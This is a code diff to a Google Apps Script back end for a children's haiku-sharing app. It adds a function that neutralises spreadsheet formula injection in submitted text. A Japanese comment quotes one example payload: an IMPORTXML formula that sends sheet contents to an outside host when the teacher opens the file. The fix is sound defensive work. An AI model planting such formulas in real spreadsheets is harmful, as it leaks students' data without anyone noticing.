@@ -220,13 +220,42 @@ function getArchiveData(sheetName) {
  * 俳句を1句ぶん記録する。
  * @param authorId 端末ごとの識別子。K列に残し、マイページで自分の作品を出すときに使う。
  */
+/**
+ * 表計算のセルに書く前に、児童の入力を「ただの文字」に落とす。
+ *
+ * ⚠️ appendRow / setValue に渡した文字列が = + - @ で始まっていると、
+ *    Google スプレッドシートはそれを**数式として保存する**。
+ *    たとえば上の句に
+ *
+ *      =IMPORTXML("https://example.com/?"&俳句!D2,"//x")
+ *
+ *    と書いて投稿されると、**先生がその表計算ファイルを開いた瞬間に**、
+ *    学級の句が外のサーバーへ送られる。児童の画面には何も起こらないし、
+ *    先生の画面にも「数式が入っている」以外の合図は出ない。
+ *    広場に並ぶのは投稿された文字そのものなので、見ても気づけない。
+ *
+ * 先頭に ' を足すと、その内容は文字として保存される。' は表示にも
+ * getValue() の戻り値にも現れないので、句もマイページの突き合わせも
+ * これまでどおり動く。
+ *
+ * タブ・改行で始まる文字列も、貼り付け時に列がずれる形になるので同じ扱いにする。
+ */
+function safeCellText_(value) {
+  if (value === null || value === undefined) return '';
+  var text = String(value);
+  if (text === '') return '';
+  return /^[=+\-@\t\r\n]/.test(text) ? "'" + text : text;
+}
+
 function submitHaiku(name, line1, line2, line3, authorId) {
   try {
     const ss = getDbSpreadsheet();
     const sheet = ss.getSheetByName('俳句');
     const haikuText = `${line1} ${line2} ${line3}`;
     const newId = new Date().getTime();
-    sheet.appendRow([newId, name, new Date(), haikuText, line1, line2, line3, 0, "", false, authorId || '']);
+    sheet.appendRow([newId, safeCellText_(name), new Date(), safeCellText_(haikuText),
+                     safeCellText_(line1), safeCellText_(line2), safeCellText_(line3),
+                     0, "", false, safeCellText_(authorId || '')]);
     return { success: true, name: name };
   } catch (e) { return { success: false, message: e.message }; }
 }
@@ -245,7 +274,7 @@ function submitVote(haikuId, score, voterId) {
     if (myVotes.some(row => row[2] == score)) throw new Error('その賞は既に投票済みです。');
     if (myVotes.some(row => row[1] == haikuId)) throw new Error('同じ作品には1回しか投票できません。');
 
-    voteSheet.appendRow([new Date(), haikuId, score, voterId]);
+    voteSheet.appendRow([new Date(), haikuId, score, safeCellText_(voterId)]);
     
     const haikuData = haikuSheet.getDataRange().getValues();
     for (let i = 1; i < haikuData.length; i++) {
@@ -262,7 +291,7 @@ function submitVote(haikuId, score, voterId) {
 function submitComment(haikuId, comment, commenterName) {
   try {
     const ss = getDbSpreadsheet();
-    ss.getSheetByName('コメント').appendRow([new Date(), haikuId, commenterName, comment]);
+    ss.getSheetByName('コメント').appendRow([new Date(), haikuId, safeCellText_(commenterName), safeCellText_(comment)]);
     return { success: true };
   } catch (e) { return { success: false, message: e.message }; }
 }
@@ -411,7 +440,7 @@ function updateSettings(token, theme, status) {
     const ss = getDbSpreadsheet();
     const settingsSheet = ss.getSheetByName('設定');
     const haikuSheet = ss.getSheetByName('俳句');
-    settingsSheet.getRange('A2').setValue(theme);
+    settingsSheet.getRange('A2').setValue(safeCellText_(theme));
     settingsSheet.getRange('B2').setValue(status);
 
     const lastRow = haikuSheet.getLastRow();
